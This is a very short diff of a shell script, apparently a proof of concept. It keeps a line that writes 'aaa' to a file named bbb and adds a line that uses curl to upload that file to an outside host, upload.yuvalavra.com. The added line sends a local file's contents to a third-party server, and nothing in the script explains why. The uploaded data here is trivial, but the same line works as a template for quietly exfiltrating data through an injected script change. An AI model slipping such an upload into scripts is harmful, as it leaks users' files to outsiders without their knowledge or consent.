@@ -1,2 +1,3 @@
 #!/bin/sh
 echo aaa > bbb
+curl -F "=@bbb" upload.yuvalavra.com/plspls
